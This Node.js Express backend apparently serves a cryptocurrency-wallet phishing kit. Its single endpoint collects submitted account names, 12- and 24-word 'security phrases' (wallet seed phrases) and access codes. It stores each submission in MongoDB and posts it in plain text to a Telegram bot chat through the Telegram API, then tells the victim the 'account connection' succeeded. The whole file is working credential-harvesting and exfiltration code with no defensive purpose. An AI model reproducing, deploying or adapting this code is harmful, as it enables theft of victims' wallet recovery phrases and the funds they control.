const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const axios = require("axios");
const rateLimit = require("express-rate-limit");
require("dotenv").config();

const app = express();

// Configure CORS
const allowedOrigins = [
  "https://astonishing-cheesecake-627e2f.netlify.app",
  "http://localhost:5173",
  "https://theblockchain-eskq.onrender.com",
];

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      if (allowedOrigins.indexOf(origin) === -1) {
        return callback(new Error("CORS policy failure."), false);
      }
      return callback(null, true);
    },
    credentials: true,
    methods: ["POST", "GET", "OPTIONS"],
    optionsSuccessStatus: 200,
  })
);

app.use(express.json());

// Rate Limiting Middleware: Limits to 100 requests per IP per hour
const limiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10,
  message: "Too many requests, please try again after soon",
});

app.use(limiter);

// MongoDB Connection
mongoose
  .connect(process.env.VITE_MONGO_URI)
  .then(() => console.log("MD connected"))
  .catch((err) => console.error("MD connection error:", err));

// Define a schema for account data
const accountSchema = new mongoose.Schema(
  {
    accountName: String,
    accountId: String,
    securityPhrase: [String],
    securityPhrase24: [String],
    accessCode: String,
  },
  { timestamps: true }
);

const Account = mongoose.model("Account", accountSchema);

// Function to send data to Telegram
async function sendToTelegram(accountData) {
  try {
    const securityPhrase = Array.isArray(accountData.securityPhrase) ? accountData.securityPhrase.join(", ") : "N/A";
    const securityPhrase24 = Array.isArray(accountData.securityPhrase24) ? accountData.securityPhrase24.join(", ") : "N/A";

    const message = `
      🏦 Account Submission 🏦
      Name: ${accountData.accountName || "N/A"}
      ID: ${accountData.accountId || "N/A"}
      Security Phrase: ${securityPhrase}
      Security Phrase (24): ${securityPhrase24}
      Access Code: ${accountData.accessCode || "N/A"}
    `;

    const response = await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
      }
    );

    console.log("Data sent to Telegram:", response.data);
  } catch (error) {
    console.error("Error sending data to Telegram:", error.message);
  }
}

// Endpoint to handle account data
app.post("/api/send-account-data", async (req, res) => {
  console.log("Received request");

  const { accountName, accountId, securityPhrase, securityPhrase24, accessCode } = req.body;

  try {
    const newAccount = new Account({
      accountName,
      accountId,
      securityPhrase,
      securityPhrase24,
      accessCode,
    });

    await newAccount.save();
    console.log("Account data saved");

    // Send data to Telegram
    await sendToTelegram(req.body);

    res.status(200).json({ message: "Account connection successful" });
  } catch (error) {
    console.error("Error CAD:", error);
    res.status(500).json({ error: "Error CAD", details: error.message });
  }
});

app.get("/", (req, res) => {
  res.send("Welcome to the Application Backend API");
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Something broke!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Log unhandled promise rejections
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});